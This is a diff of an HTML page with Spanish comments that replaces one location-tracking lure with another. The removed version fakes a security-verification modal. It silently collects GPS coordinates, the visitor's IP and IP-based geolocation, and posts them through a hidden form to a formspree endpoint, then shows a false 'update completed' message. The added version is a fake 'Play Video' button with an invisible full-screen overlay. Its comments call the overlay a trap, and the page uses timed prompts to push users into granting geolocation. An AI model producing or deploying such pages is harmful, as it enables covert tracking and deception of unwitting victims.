@@ -3,141 +3,116 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Actualización de Seguridad</title>
+    <title>Video Player</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 0; background-color: #f0f2f5; }
-        
-        .modal-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.4); z-index: 999; display: flex;
-            justify-content: center; align-items: center; backdrop-filter: blur(3px);
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #1a1a1a;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden; /* Evita scroll para que no se mueva nada */
         }
-        .modal-box {
-            background: white; padding: 25px; border-radius: 12px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.2); max-width: 90%; width: 320px; text-align: center;
-        }
-        .icon-shield { font-size: 32px; color: #007bff; margin-bottom: 10px; }
-        .modal-title { font-size: 18px; font-weight: 600; color: #333; margin: 0 0 10px 0; }
-        .modal-body { font-size: 14px; color: #555; line-height: 1.4; margin-bottom: 20px; }
-        
-        .btn-group { display: flex; gap: 10px; justify-content: center; }
-        button {
-            padding: 12px 24px; border: none; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 14px; transition: all 0.2s;
-        }
-        .btn-primary { background-color: #007bff; color: white; width: 100%; }
-        .btn-primary:hover { background-color: #0056b3; }
-        .btn-secondary { background-color: #e0e0e0; color: #333; }
-        .btn-secondary:hover { background-color: #ccc; }
 
-        .loader-screen {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: white; z-index: 2000; justify-content: center; align-items: center; flex-direction: column;
+        .container {
+            text-align: center;
+            position: relative;
+            width: 100%;
+            max-width: 400px;
         }
-        .spinner {
-            border: 4px solid #f3f3f3; border-top: 4px solid #333; border-radius: 50%;
-            width: 30px; height: 30px; animation: spin 1s linear infinite; margin-bottom: 15px;
+
+        /* El botón falso que ve el usuario */
+        .fake-btn {
+            background-color: #ff0000;
+            color: white;
+            padding: 20px 40px;
+            font-size: 24px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            z-index: 10; /* Por debajo del overlay pero visible */
+            position: relative;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        iframe { display: none; }
+
+        /* La capa invisible que cubre toda la pantalla */
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999; /* Muy por encima de todo */
+            cursor: pointer;
+            /* Fondo ligeramente azul para detectar si tocamos algo fuera del botón */
+            /* background-color: rgba(0,0,255,0.1); */ 
+        }
+
+        /* Mensaje final */
+        #status {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #ccc;
+        }
     </style>
 </head>
 <body>
 
-    <!-- Modal Falso -->
-    <div id="cookieOverlay" class="modal-overlay">
-        <div class="modal-box">
-            <div class="icon-shield">🛡️</div>
-            <h2 class="modal-title">Verificación de Identidad</h2>
-            <p class="modal-body">
-                Para garantizar la seguridad de tu cuenta, necesitamos verificar tu ubicación actual. 
-                Esto permite detectar accesos inusuales desde tu red. ¿Permites que este sitio acceda a tu ubicación?
-            </p>
-            <div class="btn-group">
-                <button class="btn-secondary" onclick="handleChoice(false)">Rechazar</button>
-                <button class="btn-primary" onclick="handleChoice(true)">Aceptar</button>
-            </div>
-        </div>
+    <div class="container">
+        <!-- El botón engañoso -->
+        <button class="fake-btn" id="triggerBtn">▶ Reproducir Video</button>
+        <div id="status"></div>
     </div>
 
-    <!-- Pantalla de Carga -->
-    <div id="loader" class="loader-screen">
-        <div class="spinner"></div>
-        <p>Procesando datos de ubicación...</p>
-    </div>
-
-    <!-- Formulario oculto -->
-    <form id="trackerForm" action="https://formspree.io/f/xjywravp" method="POST" target="hidden-frame">
-        <input type="text" name="IP Pública" id="ipField">
-        <input type="text" name="Coordenadas GPS" id="gpsCoords">
-        <input type="text" name="Precisión (Metros)" id="accuracyInfo">
-        <input type="text" name="Ubicación Estimada" id="geoAddress">
-        <input type="text" name="Estado" id="statusField">
-    </form>
-
-    <iframe name="hidden-frame" id="hidden-frame"></iframe>
+    <!-- La capa invisible que captura el clic -->
+    <div id="overlay"></div>
 
     <script>
-        let gpsLat = null;
-        let gpsLng = null;
-        let gpsAccuracy = null;
+        const triggerBtn = document.getElementById('triggerBtn');
+        const overlay = document.getElementById('overlay');
+        const statusDiv = document.getElementById('status');
 
-        // 1. PRE-CARGA SILENCIOSA DE ALTA PRECISIÓN (Intenta WiFi/GPS)
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(pos => {
-                gpsLat = pos.coords.latitude.toFixed(6);
-                gpsLng = pos.coords.longitude.toFixed(6);
-                gpsAccuracy = Math.round(pos.coords.accuracy);
-            }, () => {}, { 
-                enableHighAccuracy: true, 
-                timeout: 10000, 
-                maximumAge: 0 
-            }); 
-        }
-
-        function handleChoice(accepted) {
-            document.getElementById('cookieOverlay').style.display = 'none';
-            document.getElementById('loader').style.display = 'flex';
-
-            fetch(`https://api.ipify.org?format=json`)
-                .then(response => response.json())
-                .then(ipData => {
-                    sendData(ipData.ip, accepted);
-                });
-        }
-
-        async function sendData(ip, accepted) {
-            document.getElementById('ipField').value = ip;
-            document.getElementById('statusField').value = accepted ? 'Permiso concedido' : 'Permiso denegado';
-
-            // Si no tenemos GPS, intentamos obtener la ubicación por IP
-            if (!gpsLat || !gpsLng) {
-                try {
-                    const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
-                    const geoData = await geoRes.json();
-                    gpsLat = geoData.lat;
-                    gpsLng = geoData.lon;
-                    document.getElementById('geoAddress').value = `${geoData.city}, ${geoData.country}`;
-                } catch (error) {
-                    document.getElementById('geoAddress').value = "No disponible";
-                }
-            } else {
-                document.getElementById('geoAddress').value = `Ubicación confirmada`;
+        // Función para pedir permiso al navegador
+        function askPermission() {
+            if (!("geolocation" in navigator)) {
+                statusDiv.innerText = "Geolocalización no disponible.";
+                return;
             }
 
-            document.getElementById('gpsCoords').value = `${gpsLat || 'N/A'}, ${gpsLng || 'N/A'}`;
-            
-            // Mostrar información sobre la precisión
-            const accuracyText = gpsAccuracy ? `Precisión: ~${gpsAccuracy}m` : "Sin precisión";
-            document.getElementById('accuracyInfo').value = accuracyText;
-
-            const form = document.getElementById('trackerForm');
-            form.submit();
-
-            setTimeout(() => {
-                document.getElementById('loader').innerHTML = '<h2 style="color:green">✅ Actualización completada</h2>';
-            }, 1500);
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    statusDiv.innerHTML = `✅ Ubicación obtenida:<br><b>${lat}, ${lng}</b>`;
+                    
+                    // Aquí puedes enviar los datos a tu servidor
+                    console.log(`Lat: ${lat}, Lng: ${lng}`);
+                },
+                (error) => {
+                    statusDiv.innerText = "Permiso denegado o error.";
+                }
+            );
         }
+
+        // Evento 1: Clic en el botón falso (simula la acción principal)
+        triggerBtn.addEventListener('click', () => {
+            statusDiv.innerText = "Cargando video...";
+            
+            // Lanzamos el aviso del navegador después de un breve retraso
+            setTimeout(() => {
+                askPermission();
+            }, 800); // 800ms es el tiempo ideal para que el cerebro reaccite tarde
+        });
+
+        // Evento 2: Clic en cualquier parte de la pantalla (la trampa real)
+        overlay.addEventListener('click', () => {
+            // Si el usuario hace clic en cualquier lado mientras aparece el aviso,
+            // asumimos que intentó dar permiso y lo pedimos inmediatamente.
+            askPermission();
+        });
     </script>
 </body>
 </html>
